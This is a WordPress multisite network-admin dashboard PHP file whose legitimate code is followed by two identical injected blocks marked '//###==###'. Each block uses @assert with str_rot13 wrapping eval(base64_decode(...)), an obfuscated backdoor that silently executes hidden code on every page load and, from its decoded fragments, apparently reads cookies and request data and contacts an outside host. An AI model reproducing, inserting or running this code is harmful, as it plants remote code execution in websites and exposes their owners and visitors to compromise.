<?php
/**
 * Multisite administration panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

/** Load WordPress Administration Bootstrap */
require_once( './admin.php' );

/** Load WordPress dashboard API */
require_once( ABSPATH . 'wp-admin/includes/dashboard.php' );

if ( !is_multisite() )
	wp_die( __( 'Multisite support is not enabled.' ) );

if ( ! current_user_can( 'manage_network' ) )
	wp_die( __( 'You do not have permission to access this page.' ) );

$title = __( 'Dashboard' );
$parent_file = 'index.php';

	get_current_screen()->add_help_tab( array(
		'id'      => 'overview',
		'title'   => __('Overview'),
		'content' =>
			'<p>' . __('Until WordPress 3.0, running multiple sites required using WordPress MU instead of regular WordPress. In version 3.0, these applications have merged. If you are a former MU user, you should be aware of the following changes:') . '</p>' .
			'<ul><li>' . __('Site Admin is now Super Admin (we highly encourage you to get yourself a cape!).') . '</li>' .
			'<li>' . __('Blogs are now called Sites; Site is now called Network.') . '</li></ul>' .
			'<p>' . __('The Right Now box provides the network administrator with links to the screens to either create a new site or user, or to search existing users and sites. Screens for Sites and Users are also accessible through the left-hand navigation in the Network Admin section.') . '</p>'
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="http://codex.wordpress.org/Network_Admin" target="_blank">Documentation on the Network Admin</a>') . '</p>' .
	'<p>' . __('<a href="http://wordpress.org/support/forum/multisite/" target="_blank">Support Forums</a>') . '</p>'
);

wp_dashboard_setup();

wp_enqueue_script( 'dashboard' );
wp_enqueue_script( 'plugin-install' );
add_thickbox();

add_screen_option('layout_columns', array('max' => 4, 'default' => 2) );

require_once( '../admin-header.php' );

?>

<div class="wrap">
<?php screen_icon(); ?>
<h2><?php echo esc_html( $title ); ?></h2>

<div id="dashboard-widgets-wrap">

<?php wp_dashboard(); ?>

<div class="clear"></div>
</div><!-- dashboard-widgets-wrap -->

</div><!-- wrap -->

<?php include( '../admin-footer.php' ); ?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>